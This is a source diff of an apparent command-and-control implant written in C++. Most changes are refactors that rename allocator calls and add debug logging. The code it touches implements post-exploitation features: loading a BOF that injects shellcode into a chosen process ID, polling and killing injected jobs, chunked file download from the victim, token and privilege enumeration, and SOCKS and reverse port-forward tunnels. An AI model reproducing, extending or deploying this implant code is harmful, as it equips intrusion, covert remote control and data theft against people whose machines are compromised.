@@ -24,7 +24,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
         if ( DataPsr ) {
             BOOL IsTracked = Self->Hp->CheckPtr( DataPsr );
             if ( IsTracked ) {
-                hFree( DataPsr );
+                KhFree( DataPsr );
             } else {
                 KhDbg("WARNING: DataPsr not tracked, cannot free!");
             }
@@ -53,7 +53,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
         return FinalRoutine();
     }
 
-    Parser = (PARSER*)hAlloc( sizeof(PARSER) );
+    Parser = (PARSER*)KhAlloc( sizeof(PARSER) );
     if ( ! Parser ) {
         KhDbg("ERROR: Failed to allocate parser memory");
         return FinalRoutine();
@@ -119,153 +119,159 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 auto DECLFN Task::Postex(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
+    KhDbg("[Task::Postex] ENTER - Job UUID: %s", Job->UUID);
+
     PARSER*  Parser  = Job->Psr;
     PACKAGE* Package = Job->Pkg;
 
+    KhDbg("[Task::Postex] Parser: %p, Package: %p", Parser, Package);
+    KhDbg("[Task::Postex] Parser->Buffer: %p, Parser->Length: %d", Parser ? Parser->Buffer : nullptr, Parser ? Parser->Length : 0);
+    KhDbg("[Task::Postex] Parser Endian flag: %d", Self->Psr->Endian);
+
     ULONG SubCmd = Self->Psr->Int32( Parser );
-    
+
+    KhDbg("[Task::Postex] SubCmd: %d", SubCmd);
+
     Self->Pkg->Int32( Package, SubCmd );
 
+    if ( !SubCmd ) SubCmd = Self->Postex.SubId;
+
     switch ( (Action::Postex)SubCmd ) {
-    
+
     case Action::Postex::Inject: {
-        //
-        // verify if need be loaded
-        //
-        ULONG BofLen = 0;
+        KhDbg("[Task::Postex::Inject] ENTER");
+        KhDbg("[Task::Postex::Inject] Parser before Bytes: Buffer=%p, Length=%d", Parser->Buffer, Parser->Length);
+
+        ULONG BofLen  = 0;
         PBYTE BofData = Self->Psr->Bytes( Parser, &BofLen );
 
-        if ( BofLen > 0 && ! Self->Postex.IsLoaded ) {
-            // first time - map bof
-            Self->Postex.Mapped = (COFF_MAPPED*)hAlloc( sizeof(COFF_MAPPED) );
-            
-            if ( ! Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
-                Self->Pkg->Int32( Package, 0 ); // error
+        KhDbg("[Task::Postex::Inject] BofData: %p, BofLen: %d, IsLoaded: %d", BofData, BofLen, Self->Postex.IsLoaded);
+
+        if ( BofLen > 0 && !Self->Postex.IsLoaded ) {
+            KhDbg("[Task::Postex::Inject] First time loading PostexKit");
+
+            Self->Postex.Mapped = (COFF_MAPPED*)KhAlloc( sizeof(COFF_MAPPED) );
+
+            if ( !Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
+                KhDbg("[Task::Postex::Inject] ERROR: Failed to map BOF");
+                Self->Pkg->Int32( Package, 0 );
                 return KhGetError;
             }
 
-            // Resolve entry points
-            Self->Postex.fn_inject  = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_inject" );
-            Self->Postex.fn_poll    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_poll" );
-            Self->Postex.fn_kill    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_kill" );
-            Self->Postex.fn_list    = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_list" );
-            Self->Postex.fn_cleanup = Self->Cf->FindSymbol( Self->Postex.Mapped, (PCHAR)"go_cleanup" );
+            KhDbg("[Task::Postex::Inject] BOF mapped successfully");
+
+            PCHAR symbols[] = {
+                (PCHAR)"go_inject", (PCHAR)"go_poll",  (PCHAR)"go_kill",
+                (PCHAR)"go_list",   (PCHAR)"go_cleanup"
+            };
+
+            PVOID* targets[] = {
+                &Self->Postex.fn_inject, &Self->Postex.fn_poll,  &Self->Postex.fn_kill,
+                &Self->Postex.fn_list,   &Self->Postex.fn_cleanup
+            };
+
+            for ( int i = 0; i < 5; i++ ) {
+                *targets[i] = Self->Cf->FindSymbol( Self->Postex.Mapped, symbols[i] );
+            }
+
+            KhDbg("[Task::Postex::Inject] Symbols: inject=%p, poll=%p, kill=%p, list=%p, cleanup=%p",
+                Self->Postex.fn_inject, Self->Postex.fn_poll, Self->Postex.fn_kill,
+                Self->Postex.fn_list, Self->Postex.fn_cleanup);
 
             Self->Postex.IsLoaded = TRUE;
-
-            // create a persistent job polling
-            PARSER* PollPsr = (PARSER*)hAlloc( sizeof(PARSER) );
-            PBYTE   PollBuf = (BYTE*)hAlloc( sizeof(UINT16) + sizeof(UINT32) );
-            UINT16  PollCmd = (UINT16)Action::Task::PostEx;
-            UINT32  PollSub = (UINT32)Action::Postex::Poll;
-
-            // create: [cmd][subcmd]
-            PollBuf[0] = (PollCmd     )  & 0xFF;
-            PollBuf[1] = (PollCmd >> 8)  & 0xFF;
-            PollBuf[2] = (PollSub      ) & 0xFF;
-            PollBuf[3] = (PollSub >>  8) & 0xFF;
-            PollBuf[4] = (PollSub >> 16) & 0xFF;
-            PollBuf[5] = (PollSub >> 24) & 0xFF;
-
-            Self->Psr->New( PollPsr, PollBuf, sizeof(UINT16) + sizeof(UINT32) );
-            hFree( PollBuf );
-
-            Self->Jbs->Create( Self->Jbs->PostexUUID, PollPsr, TRUE );
-
             KhDbg("PostexKit loaded, poll job created");
         }
 
-        if ( ! Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
+        if ( !Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
+            KhDbg("[Task::Postex::Inject] ERROR: Not loaded or fn_inject is null (IsLoaded=%d, fn_inject=%p)",
+                Self->Postex.IsLoaded, Self->Postex.fn_inject);
             Self->Pkg->Int32( Package, 0 );
             return KhGetError;
         }
 
-        //
-        // parse args of inject: method, pid, shellcode and pass to go_inject
-        //
-        ULONG ArgsLen = Parser->Length;  
-        PBYTE Args    = (PBYTE)Parser->Buffer;
+        ULONG ArgsLen = 0;
+        PBYTE Args    = (PBYTE)Self->Psr->Bytes( Parser, &ArgsLen );
 
-        typedef void (*GO_FN)(char*, int);
-        GO_FN fn = (GO_FN)Self->Postex.fn_inject;
-        fn( (char*)Args, ArgsLen );
+        KhDbg("[Task::Postex::Inject] Calling go_inject with Args=%p, ArgsLen=%d", Args, ArgsLen);
 
-        Self->Pkg->Int32( Package, 1 ); 
+        ((BOOL(*)(char*, int))Self->Postex.fn_inject)( (char*)Args, ArgsLen );
+
+        KhDbg("[Task::Postex::Inject] go_inject returned");
+        Self->Pkg->Int32( Package, 1 );
+
+        Self->Postex.SubId = (INT32)Action::Postex::Poll;
+        Job->Clean = FALSE;
         break;
     }
 
     case Action::Postex::Poll: {
+        KhDbg("[Task::Postex::Poll] ENTER (IsLoaded=%d, fn_poll=%p)", Self->Postex.IsLoaded, Self->Postex.fn_poll);
+
         if ( !Self->Postex.IsLoaded || !Self->Postex.fn_poll ) {
+            KhDbg("[Task::Postex::Poll] Not loaded, marking job for cleanup");
             Job->Clean = TRUE;
             return KhRetSuccess;
         }
 
-        typedef void (*GO_FN)(char*, int);
-        GO_FN fn = (GO_FN)Self->Postex.fn_poll;
-        fn( nullptr, 0 );
+        KhDbg("[Task::Postex::Poll] Calling go_poll");
 
-        // check count via BeaconGetValue
-        PUINT32 CountPtr = (PUINT32)Self->Cf->GetValue( "\x8e\x4b\x2d\xf7\x5c\x9a\x3e\xb1" );
-        
-        if ( CountPtr && *CountPtr == 0 ) {
-            // if not anyone postex, so unmap
+        BOOL clean = ((BOOL(*)(char*, int))Self->Postex.fn_poll)( nullptr, 0 );
+
+        KhDbg("[Task::Postex::Poll] go_poll returned to clean %s", clean ? "TRUE" : "FALSE");
+
+        if ( clean ) {
             Self->Cf->Unmap( Self->Postex.Mapped );
-            hFree( Self->Postex.Mapped );
-            
-            Self->Postex.Mapped     = nullptr;
-            Self->Postex.IsLoaded   = FALSE;
-            Self->Postex.fn_inject  = nullptr;
-            Self->Postex.fn_poll    = nullptr;
-            Self->Postex.fn_kill    = nullptr;
-            Self->Postex.fn_list    = nullptr;
-            Self->Postex.fn_cleanup = nullptr;
+            KhFree( Self->Postex.Mapped );
+            Mem::Zero( (UPTR)&Self->Postex, sizeof(Self->Postex) );
 
             Job->Clean = TRUE;
             KhDbg("PostexKit unloaded, no active postex");
         } else {
-            Job->Clean = FALSE;  // continue polling
+            Job->Clean = FALSE;
         }
         break;
     }
 
-    case Action::Postex::Kill: {
-        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_kill ) {
-            return KhGetError;
-        }
-
-        ULONG ArgsLen = Parser->Length;
-        PBYTE Args    = (PBYTE)Parser->Buffer;
-
-        typedef void (*GO_FN)(char*, int);
-        GO_FN fn = (GO_FN)Self->Postex.fn_kill;
-        fn( (char*)Args, ArgsLen );
-        break;
-    }
-
-    case Action::Postex::List: {
-        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_list ) {
-            return KhGetError;
-        }
-
-        typedef void (*GO_FN)(char*, int);
-        GO_FN fn = (GO_FN)Self->Postex.fn_list;
-        fn( nullptr, 0 );
-        break;
-    }
-
+    case Action::Postex::Kill:
+    case Action::Postex::List:
     case Action::Postex::Cleanup: {
-        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_cleanup ) {
+        KhDbg("[Task::Postex::%s] ENTER", 
+            SubCmd == (ULONG)Action::Postex::Kill ? "Kill" : 
+            SubCmd == (ULONG)Action::Postex::List ? "List" : "Cleanup");
+
+        PVOID fn = nullptr;
+
+        switch ( (Action::Postex)SubCmd ) {
+            case Action::Postex::Kill:    fn = Self->Postex.fn_kill;    break;
+            case Action::Postex::List:    fn = Self->Postex.fn_list;    break;
+            case Action::Postex::Cleanup: fn = Self->Postex.fn_cleanup; break;
+            default: break;
+        }
+
+        if ( !Self->Postex.IsLoaded || !fn ) {
+            KhDbg("[Task::Postex] ERROR: Not loaded or fn is null");
             return KhGetError;
         }
 
-        typedef void (*GO_FN)(char*, int);
-        GO_FN fn = (GO_FN)Self->Postex.fn_cleanup;
-        fn( nullptr, 0 );
+        PBYTE Args    = (SubCmd == (ULONG)Action::Postex::Kill) ? (PBYTE)Parser->Buffer : nullptr;
+        ULONG ArgsLen = (SubCmd == (ULONG)Action::Postex::Kill) ? Parser->Length : 0;
+
+        KhDbg("[Task::Postex] Calling subcmd %d with Args=%p, ArgsLen=%d", SubCmd, Args, ArgsLen);
+
+        ((void(*)(char*, int))fn)( (char*)Args, ArgsLen );
+
+        KhDbg("[Task::Postex] subcmd %d returned", SubCmd);
+        break;
+    }
+
+    default: {
+        KhDbg("[Task::Postex] ERROR: Unknown SubCmd: %d", SubCmd);
         break;
     }
 
     }
 
+    KhDbg("[Task::Postex] EXIT");
     return KhRetSuccess;
 }
 
@@ -340,7 +346,7 @@ auto DECLFN Task::ProcessDownloads(
                 FILE_BEGIN
             );
 
-            BYTE* FileBuffer = B_PTR( hAlloc( chunksize ) );
+            BYTE* FileBuffer = B_PTR( KhAlloc( chunksize ) );
             ULONG BytesRead  = 0;
 
             if ( ! Self->Krnl32.ReadFile( Self->Tsp->Down[i].FileHandle, FileBuffer, chunksize, &BytesRead, 0 ) || BytesRead == 0 ) {
@@ -348,7 +354,7 @@ auto DECLFN Task::ProcessDownloads(
                 KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
 
                 Self->Ntdll.NtClose( Self->Tsp->Down[i].FileHandle );
-                hFree(FileBuffer);
+                KhFree(FileBuffer);
 
                 Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
                 Events[StartEvtLen].ErrorCode = 1;
@@ -356,7 +362,7 @@ auto DECLFN Task::ProcessDownloads(
                 Events[StartEvtLen].Reason = Reason;
                 StartEvtLen++;
 
-                if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
+                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
                 Self->Tsp->Down[i].FileID = nullptr;
                 Self->Tsp->Down[i].Path = nullptr;
 
@@ -379,7 +385,7 @@ auto DECLFN Task::ProcessDownloads(
             } else {
                 Self->Ntdll.NtClose(Self->Tsp->Down[i].FileHandle);
                 
-                if ( Self->Tsp->Down[i].Path ) hFree( Self->Tsp->Down[i].Path );
+                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
                 Self->Tsp->Down[i].FileID = nullptr;
                 Self->Tsp->Down[i].Path = nullptr;
                 Self->Tsp->DownloadTasksCount--;
@@ -420,12 +426,12 @@ auto DECLFN Task::ProcessDownloads(
 
     for (INT i = 0; i < StartEvtLen; i++) {
         if ( Events[i].Data && Events[i].ErrorCode == 0 ) {
-            hFree( Events[i].Data );
+            KhFree( Events[i].Data );
         }
         
         if ( Events[i].FileID && 
              (Events[i].ErrorCode != 0 || Events[i].CurChunk == Events[i].TotalChunks) ) {
-            hFree( Events[i].FileID );
+            KhFree( Events[i].FileID );
         }
     }
 
@@ -504,12 +510,12 @@ auto DECLFN Task::Download(
     FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
 
     ULONG FileIDLen  = Str::LengthA( FileID );
-    CHAR* FileIDCopy = (CHAR*)hAlloc( FileIDLen + 1 );
+    CHAR* FileIDCopy = (CHAR*)KhAlloc( FileIDLen + 1 );
 
     Str::CopyA( FileIDCopy, FileID );
 
     ULONG FilePathLen  = Str::LengthA( FilePath );
-    CHAR* FilePathCopy = (CHAR*)hAlloc( FilePathLen + 1 );
+    CHAR* FilePathCopy = (CHAR*)KhAlloc( FilePathLen + 1 );
 
     Str::CopyA( FilePathCopy, FilePath );
 
@@ -525,14 +531,14 @@ auto DECLFN Task::Download(
     if ( Self->Tsp->DownloadTasksCount == 1 ) {
         KhDbg("Adding Process Downloads job");
         PARSER* TmpPsrDownload = nullptr;
-        BYTE*   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+        BYTE*   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
         UINT16  CmdDownload    = (UINT16)Action::Task::ProcessDownloads;
         JOBS*   NewJobDownload = nullptr;
         // 4-byte big-endian length
         TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
         TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
-        TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
+        TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
         if ( ! TmpPsrDownload ) {         
             KhDbg("ERROR: Failed to create TmpParser");
             return KhGetError;
@@ -540,7 +546,7 @@ auto DECLFN Task::Download(
     
         Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
 
-        hFree( TmpBufDownload );
+        KhFree( TmpBufDownload );
     
         NewJobDownload = Self->Jbs->Create( Self->Jbs->DownloadUUID, TmpPsrDownload, TRUE );
         if ( ! NewJobDownload ) {
@@ -710,12 +716,12 @@ auto DECLFN Task::Upload(
                 }
 
                 if ( Self->Tsp->Up[FileIndex].FileID ) {
-                    hFree( Self->Tsp->Up[FileIndex].FileID );
+                    KhFree( Self->Tsp->Up[FileIndex].FileID );
                     Self->Tsp->Up[FileIndex].FileID = nullptr;
                 }
                 
                 if ( Self->Tsp->Up[FileIndex].Path ) {
-                    hFree( Self->Tsp->Up[FileIndex].Path );
+                    KhFree( Self->Tsp->Up[FileIndex].Path );
                     Self->Tsp->Up[FileIndex].Path = nullptr;
                 }
                 Self->Tsp->Up[FileIndex].FileID = "";
@@ -785,7 +791,7 @@ auto DECLFN Task::Token(
             
             if ( ThreadUser ) {
                 Self->Pkg->Str( Package, ThreadUser );
-                hFree( ThreadUser ); KhSetError( ERROR_SUCCESS );
+                KhFree( ThreadUser ); KhSetError( ERROR_SUCCESS );
             } else {
                 KhSetError( ERROR_NO_TOKEN );
             }
@@ -987,13 +993,13 @@ auto DECLFN Task::Token(
                     Self->Pkg->Int32( Package, PrivList[i]->Attributes );
                     
                     if ( PrivList[i]->PrivName ) {
-                        hFree( PrivList[i]->PrivName );
+                        KhFree( PrivList[i]->PrivName );
                     }
 
-                    hFree( PrivList[i] );
+                    KhFree( PrivList[i] );
                 }
 
-                hFree( PrivList );
+                KhFree( PrivList );
             }
 
             Self->Ntdll.NtClose( TokenHandle );
@@ -1197,7 +1203,7 @@ auto DECLFN Task::ProcessTunnel(
                 KhDbg("rc != -1, DataLength=%lu on Tunnel %d", DataLength, Self->Tsp->Tunnels[i].ChannelID);
                 if ( DataLength ) {
                     
-                    PBYTE Buffer = (PBYTE)hAlloc( DataLength );
+                    PBYTE Buffer = (PBYTE)KhAlloc( DataLength );
                     if ( ! Buffer ) continue;
                     
                     BYTE* BufferBase = Buffer; // Keep original pointer for freeing and accessing data
@@ -1247,7 +1253,7 @@ auto DECLFN Task::ProcessTunnel(
                             StartEvtLen++;
                         }
 
-                        hFree( BufferBase );
+                        KhFree( BufferBase );
                     } else if ( readed ) {
                         KhDbg("readed %lu bytes from Tunnel %d, Adding to COMMAND_TUNNEL_WRITE_TCP", readed, Self->Tsp->Tunnels[i].ChannelID);
 
@@ -1261,7 +1267,7 @@ auto DECLFN Task::ProcessTunnel(
 
                         iterCount += 1;
                     } else {
-                        hFree( BufferBase );
+                        KhFree( BufferBase );
                     }
                 }
             }
@@ -1310,7 +1316,7 @@ auto DECLFN Task::ProcessTunnel(
 
     for ( ULONG i = 0; i < WriteEvtLen; i++ ) {
         if ( WriteEvents[i].Data ) {
-            hFree( WriteEvents[i].Data );
+            KhFree( WriteEvents[i].Data );
         }
     }
  
@@ -1335,15 +1341,15 @@ auto DECLFN Task::ProcessTunnel(
 				// Free allocated strings before resetting the tunnel
 				if (Self->Tsp->Tunnels[i].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Host)) {
 					KhDbg("Freeing Host pointer");
-					hFree(Self->Tsp->Tunnels[i].Host);
+					KhFree(Self->Tsp->Tunnels[i].Host);
 					Self->Tsp->Tunnels[i].Host = nullptr;
 				}
 				if (Self->Tsp->Tunnels[i].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Username)) {
-					hFree(Self->Tsp->Tunnels[i].Username);
+					KhFree(Self->Tsp->Tunnels[i].Username);
 					Self->Tsp->Tunnels[i].Username = nullptr;
 				}
 				if (Self->Tsp->Tunnels[i].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Password)) {
-					hFree(Self->Tsp->Tunnels[i].Password);
+					KhFree(Self->Tsp->Tunnels[i].Password);
 					Self->Tsp->Tunnels[i].Password = nullptr;
 				}
 
@@ -1404,15 +1410,15 @@ auto DECLFN Task::Socks(
 
             // Defensive: ensure any old allocations from this slot are freed before reuse
             if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
-                hFree(Self->Tsp->Tunnels[Index].Host);
+                KhFree(Self->Tsp->Tunnels[Index].Host);
                 Self->Tsp->Tunnels[Index].Host = nullptr;
             }
             if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
-                hFree(Self->Tsp->Tunnels[Index].Username);
+                KhFree(Self->Tsp->Tunnels[Index].Username);
                 Self->Tsp->Tunnels[Index].Username = nullptr;
             }
             if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
-                hFree(Self->Tsp->Tunnels[Index].Password);
+                KhFree(Self->Tsp->Tunnels[Index].Password);
                 Self->Tsp->Tunnels[Index].Password = nullptr;
             }
 
@@ -1442,7 +1448,7 @@ auto DECLFN Task::Socks(
                             INT32 Mode = 0;
 
                             ULONG AddrLen = Str::LengthA(Address);
-                            CHAR* HostCopy = (CHAR*)hAlloc(AddrLen + 1);
+                            CHAR* HostCopy = (CHAR*)KhAlloc(AddrLen + 1);
                             if (HostCopy) {
                                 Mem::Copy(HostCopy, Address, AddrLen);
                                 HostCopy[AddrLen] = '\0';
@@ -1468,7 +1474,7 @@ auto DECLFN Task::Socks(
                                 KhDbg("Adding Process Tunnel job");
 
                                 PARSER* TmpPsrDownload = nullptr;
-                                PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+                                PBYTE   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
                                 UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                                 JOBS*   NewJobDownload = nullptr;
 
@@ -1476,7 +1482,7 @@ auto DECLFN Task::Socks(
                                 TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
                                 TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
-                                TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
+                                TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
                                 if ( ! TmpPsrDownload ) {         
                                     KhDbg("ERROR: Failed to create TmpParser");
                                     return KhGetError;
@@ -1485,13 +1491,13 @@ auto DECLFN Task::Socks(
                                 // Initialize parser (Parser::New makes an internal copy)
                                 Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
 
-                                hFree( TmpBufDownload );
+                                KhFree( TmpBufDownload );
                             
                                 // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                                 NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                                 if ( ! NewJobDownload ) {
                                     KhDbg("WARNING: Failed to create job for Process Tunnel task");
-                                    hFree(TmpBufDownload);
+                                    KhFree(TmpBufDownload);
                                     return KhGetError;
                                 }
                             }
@@ -1615,15 +1621,15 @@ auto Task::RPortfwd(
 
     // Defensive: ensure any old allocations from this slot are freed before reuse
     if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
-        hFree(Self->Tsp->Tunnels[Index].Host);
+        KhFree(Self->Tsp->Tunnels[Index].Host);
         Self->Tsp->Tunnels[Index].Host = nullptr;
     }
     if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
-        hFree(Self->Tsp->Tunnels[Index].Username);
+        KhFree(Self->Tsp->Tunnels[Index].Username);
         Self->Tsp->Tunnels[Index].Username = nullptr;
     }
     if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
-        hFree(Self->Tsp->Tunnels[Index].Password);
+        KhFree(Self->Tsp->Tunnels[Index].Password);
         Self->Tsp->Tunnels[Index].Password = nullptr;
     }
 
@@ -1667,14 +1673,14 @@ auto Task::RPortfwd(
                     if( Self->Tsp->TunnelTasksCount == 1 ){
                         KhDbg("Adding Process Tunnel job\n");
                         PARSER* TmpPsrDownload = nullptr;
-                        PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
+                        PBYTE   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
                         UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                         JOBS*   NewJobDownload = nullptr;
                         // 4-byte big-endian length
                         TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
                         TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
-                        TmpPsrDownload = (PARSER*)hAlloc( sizeof(PARSER) );
+                        TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
                         if ( ! TmpPsrDownload ) {         
                             KhDbg("ERROR: Failed to create TmpParser");
                             return KhGetError;
@@ -1683,13 +1689,13 @@ auto Task::RPortfwd(
                         // Initialize parser (Parser::New makes an internal copy)
                         Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
 
-                        hFree( TmpBufDownload );
+                        KhFree( TmpBufDownload );
                     
                         // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                         NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                         if ( ! NewJobDownload ) {
                             KhDbg("WARNING: Failed to create job for Process Tunnel task\n");
-                            hFree(TmpBufDownload);
+                            KhFree(TmpBufDownload);
                             return KhGetError;
                         }
                     }
